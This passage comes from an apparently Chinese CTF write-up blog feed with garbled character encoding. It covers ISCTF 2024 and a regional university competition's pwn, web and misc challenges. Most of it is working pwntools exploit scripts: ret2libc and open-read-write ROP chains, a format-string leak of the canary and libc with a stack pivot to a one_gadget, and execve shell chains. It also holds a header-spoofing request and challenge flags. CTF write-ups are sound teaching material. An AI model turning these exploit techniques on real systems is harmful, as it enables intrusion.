p64(bss1)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br>payload += p64(ret)<br><span class="hljs-comment">#puts(bss1)</span><br>payload += p64(pop_rdi) + p64(bss1)<br>payload += p64(puts_plt)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Š 0x100 å­—èŠ‚åˆšåˆšå¥½èƒ½å¤Ÿè¿›è¡Œæ ˆæº¢å‡ºå¹¶æ„é€  orw çš„ rop é“¾ï¼Œå› æ­¤å¯ä»¥ä¸ç”¨è¿›è¡Œæ ˆè¿ç§»ã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;27.25.151.12&#x27;</span>, <span class="hljs-number">24981</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012F2</span><br>read = <span class="hljs-number">0x4012AD</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br>pop_rdi = <span class="hljs-number">0x4012ce</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) +p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.sendline(payload)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>puts = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br><span class="hljs-comment"># attach(p)</span><br><span class="hljs-comment">#read(0, bss, 0x40)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(open_addr)<br><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br><span class="hljs-comment"># payload = payload.ljust(0x100, b&#x27;a&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="å°è“é²¨stack"><a href="#å°è“é²¨stack" class="headerlink" title="å°è“é²¨stack"></a>å°è“é²¨stack</h3><p>main å‡½æ•°å­˜åœ¨æ ˆæº¢å‡º</p><img src="/post/35326/1731414364370-0aa4893f-9f7f-49c2-b760-68d12cb66b78.png" class="" title="img"><p>gdb è°ƒè¯•ï¼Œåœ¨ main å‡½æ•°æ‰§è¡Œåˆ° ret ä¹‹åä¼šè¿›å…¥ __libc_start_main å‡½æ•°ï¼Œç„¶åæ‰§è¡Œ exit é€€å‡ºã€‚</p><img src="/post/35326/1735483922045-42855962-b83d-49be-b6d7-99148d39c411.png" class="" title="img"><p>æˆ‘ä»¬å¯ä»¥åœ¨ libc ä¸­æ‰¾åˆ° <code>call exit</code> è¿™ä¸ªä½ç½®ï¼Œä¿®æ”¹è¿”å›åœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º 0x7cï¼Œä½¿å¾—ç¨‹åºèƒ½å¤Ÿé‡æ–°æ‰§è¡Œ main å‡½æ•°ï¼ŒåŒæ—¶ä¹Ÿä¼šæ³„éœ²å‡º libcã€‚</p><img src="/post/35326/1731406123006-6af2932e-27a4-4fd1-99b0-f4a85e2f74a9.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc-2.31_9.16.so&#x27;)</span><br><span class="hljs-comment"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># p = remote(&#x27;27.25.151.12&#x27;, 36144)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>main = <span class="hljs-number">0x4011DB</span><br>pop_rdi = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x40101a</span><br><br><span class="hljs-comment"># attach(p)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p8(<span class="hljs-number">0x7c</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(addr)))<br><br>libc_base = addr - <span class="hljs-number">0x2407c</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system) + p64(<span class="hljs-number">0</span>)<br>p.sendline(payload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>çœ‹äº†å…¶ä»–å¸ˆå‚…çš„ wpï¼Œ ç”±äºè¿™é“é¢˜æ²¡æœ‰å¼€ pie ï¼Œæ‰€ä»¥å®é™…ä¸Šä¹Ÿæ˜¯ ret2libc çš„æ¿å­é¢˜ï¼Œåªä¸è¿‡éœ€è¦å¤šç”¨å‡ æ¬¡ ret æ¥å¹³è¡¡å †æ ˆã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc-2.31_9.16.so&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;27.25.151.12&#x27;, 36144)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main = <span class="hljs-number">0x4011DF</span><br>pop_rdi = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>attach(p)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi) + p64(printf_got)<br>payload+= p64(ret) + p64(printf_plt)<br>payload += p64(ret) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\x40&#x27;</span>)<br>printf_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;printf_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(printf_addr)))<br><br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h3><p>ç¨‹åºä¿æŠ¤å…¨å¼€</p><img src="/post/35326/1735386491238-542073c1-8867-4c78-bbc7-560c84cf45a8.png" class="" title="img"><p>main å‡½æ•°ï¼Œå­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><img src="/post/35326/1735386465712-c9dce7c2-3ff6-4eb1-9757-d880478afda1.png" class="" title="img"><p>vuln å‡½æ•°ï¼Œæº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€è°“çš„ off-by-one æ¼æ´</p><img src="/post/35326/1735386611672-980f710b-c82c-4a46-9521-1674394dee7b.png" class="" title="img"><p>æ³„éœ²å‡ºæ ˆåœ°å€ã€libc åœ°å€å’Œ canaryï¼Œç„¶åæ ˆè¿ç§»æ‰§è¡Œ one_gadgetã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br><br><span class="hljs-comment"># attach(p, &#x27;b *$rebase(0x1359)&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;that?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;gift!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;%15$p%11$p%9$p&#x27;</span><br>p.send(payload)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;stack:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(stack)))<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>one_gadget = libc_base + <span class="hljs-number">0xebc81</span><br>rbp = stack - <span class="hljs-number">0x160</span><br>success(<span class="hljs-string">&#x27;rbp:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(rbp)))<br>rbp1 = stack - <span class="hljs-number">0xc8</span><br>success(<span class="hljs-string">&#x27;rbp1:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(rbp1)))<br><br>payload = p64(canary) + p64(rbp1) + p64(one_gadget)<br>payload += p64(canary) + p8(rbp&amp;<span class="hljs-number">0xFF</span>)<br>p.recvuntil(<span class="hljs-string">&quot;again?????\n&quot;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š"><a href="#25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š" class="headerlink" title="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š"></a>25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š</h3><p>http ä¿®æ”¹è¯·æ±‚å¤´</p><img src="/post/35326/1731313225414-d7b64776-a98e-4bbc-a250-92426f6fed02.png" class="" title="img"><p>è¯·æ±‚å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Project Sekai<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 27 Aug 2024 10:00:00 GMT<br></code></pre></td></tr></table></figure><img src="/post/35326/1731313449061-15bdab86-92f9-445c-8626-a58def51ae9c.png" class="" title="img"><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å°è“é²¨çš„ç­¾åˆ°02"><a href="#å°è“é²¨çš„ç­¾åˆ°02" class="headerlink" title="å°è“é²¨çš„ç­¾åˆ°02"></a>å°è“é²¨çš„ç­¾åˆ°02</h3><p>010Editor æ‰“å¼€</p><img src="/post/35326/1731160718877-c1b98dff-8483-4a8c-925f-2432357685ba.png" class="" title="img"><p>ISCTF{blueshark!_@#2024$%^&amp;*}</p><h3 id="æ•°å­—è¿·é›¾ï¼šåœ¨åƒç´ ä¸­å¯»æ‰¾çº¿ç´¢"><a href="#æ•°å­—è¿·é›¾ï¼šåœ¨åƒç´ ä¸­å¯»æ‰¾çº¿ç´¢" class="headerlink" title="æ•°å­—è¿·é›¾ï¼šåœ¨åƒç´ ä¸­å¯»æ‰¾çº¿ç´¢"></a>æ•°å­—è¿·é›¾ï¼šåœ¨åƒç´ ä¸­å¯»æ‰¾çº¿ç´¢</h3><p>éšæ³¢é€æµä¸€æŠŠæ¢­</p><img src="/post/35326/1731727614112-92f38fca-ff5e-438b-bf47-0695f6ab6aad.png" class="" title="img"><p>ISCTF{+9qn1DKdun!glAK}</p><h3 id="æ¸¸å›­åœ°1"><a href="#æ¸¸å›­åœ°1" class="headerlink" title="æ¸¸å›­åœ°1"></a>æ¸¸å›­åœ°1</h3><img src="/post/35326/1731313164140-63385a14-ff83-4b74-bc1d-3f0b4141e086.jpeg" class="" title="img"><p>ISCTF{æ¹–åŒ—çœ_æ­¦æ±‰å¸‚_æ±Ÿæ±‰åŒº_ä¸­å±±å…¬å›­}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024å¹´äº¬æ´¥å†€å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›-å†³èµ›Pwn</title>
    <link href="/post/11394.html"/>
    <url>/post/11394.html</url>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªå†³èµ›ä¸¤é“Webï¼Œä¸€é“Pwnï¼ŒPwné¢˜æœ€åä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸è¿‡åšå‡ºæ¥çš„é˜Ÿä¼ä¹Ÿä¸å¤šï¼Œåé¢æ‰¾åšå‡ºæ¥çš„å¸ˆå‚…äº¤æµäº†ä¸‹ï¼Œç„¶åå‚ç…§wpè¿›è¡Œå¤ç°ã€‚</p><h1 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h1><p>pwn å‡½æ•°ä¸­ï¼Œç¬¬ä¸€ä¸ª read å¾€ bss æ®µçš„ one è¯»å…¥ 0x30 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª read å¾€ bss æ®µçš„ two è¯»å…¥ 0x40 å­—èŠ‚ï¼Œç¬¬ä¸‰ä¸ª read å¾€ buf è¯»å…¥ 0x19 å­—èŠ‚ï¼Œbuf çš„å¤§å°æ˜¯ 0x10ï¼Œå› æ­¤å­˜åœ¨ 9 ä¸ªå­—èŠ‚çš„ä¸€æ¬¡ã€‚è¿™é‡Œçš„æº¢å‡ºå­—èŠ‚æ•°æ˜æ˜¾ä¸è¶³äºè¦†ç›–è¿”å›åœ°å€ï¼Œå¾ˆæ˜æ˜¾åªèƒ½è¿›è¡Œæ ˆè¿ç§»ã€‚</p><img src="/post/11394/1735136241339-fcde1554-0df2-40cd-85ce-23881792cd46.png" class="" title="img"><p>æŸ¥çœ‹ pwn å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼Œå‘ç° leave å’Œè¿”å›åœ°å€åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„å·®è·</p><img src="/post/11394/1735136513950-89ca71a6-e884-4ccf-a294-c8b65ae242fa.png" class="" title="img"><p>æˆ‘ä»¬å¯ä»¥åœ¨æº¢å‡ºæ—¶ä¿®æ”¹è¿”å›åœ°å€çš„ä¸€ä¸ªå­—èŠ‚å˜ä¸º leaveï¼ŒåŒæ—¶ä¿®æ”¹ rbp ä¸º bss æ®µçš„ oneï¼Œå½“æ ˆè¿ç§»åˆ° bss æ®µæ—¶ï¼Œbss æ®µçš„ one å°±ä¼šä½œä¸º rspï¼Œé‚£ä¹ˆè¿˜éœ€è¦ä¸€ä¸ª bss æ®µåœ°å€ä½œä¸º rbpï¼Œè€Œè¿™ä¸ª bss æ®µåœ°å€å°±æ˜¯ two-8ã€‚æˆ‘ä»¬æˆåŠŸå°†æ ˆè¿ç§»åˆ° bss æ®µåï¼Œå¯ä»¥æ³„éœ²å‡º libcï¼Œç„¶åå¸ƒç½® execve çš„ rop é“¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./2.27-3ubuntu1.2_amd64/libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x400803</span><br>two_bss = <span class="hljs-number">0x601060</span><br>one_bss = <span class="hljs-number">0x601160</span><br>read_two = <span class="hljs-number">0x4006EA</span><br>ret = <span class="hljs-number">0x400561</span><br><br>attach(p, <span class="hljs-string">&#x27;b *0x400719&#x27;</span>)<br>payload = p64(two_bss-<span class="hljs-number">8</span>) + p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(read_two)<br>p.recvuntil(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;something?&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(one_bss) + <span class="hljs-string">b&#x27;\x1f&#x27;</span><br>p.recvuntil(<span class="hljs-string">&#x27;So, Bye?&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>execve = libc_base + libc.sym[<span class="hljs-string">&quot;execve&quot;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rsi;ret&quot;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdx;ret&quot;</span>)))<br><br>payload = p64(pop_rdi) + p64(binsh)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(execve)<br>payload = payload.ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwnå…¥é—¨ç³»åˆ—ï¼ˆäºŒï¼‰</title>
    <link href="/post/10828.html"/>
    <url>/post/10828.html</url>
    
